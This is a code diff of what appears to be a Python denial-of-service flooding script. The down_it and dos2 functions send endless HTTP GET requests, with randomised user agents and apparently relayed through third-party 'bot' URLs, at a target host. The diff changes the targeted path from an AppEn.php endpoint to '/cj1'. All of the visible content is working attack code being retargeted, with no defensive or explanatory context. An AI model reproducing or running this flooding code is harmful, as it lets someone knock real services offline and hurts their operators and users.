@@ -44,7 +44,7 @@ def bot_hammering(url):
 def down_it(item):
 	try:
 		while True:
-			packet = str("GET /AppEn.php?appid=20181215&md5=060d7b8fc04d17dc7e5fa11928947bdc HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
+			packet = str("GET /cj1 HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 			s.connect((host,int(port)))
 			if s.sendto( packet, (host, int(port)) ):
@@ -70,7 +70,7 @@ def dos():
 def dos2():
 	while True:
 		item=w.get()
-		bot_hammering(random.choice(bots)+"http://"+host+"/AppEn.php?appid=20181215&md5=060d7b8fc04d17dc7e5fa11928947bdc")
+		bot_hammering(random.choice(bots)+"http://"+host+"/cj1")
 		w.task_done()
 
 
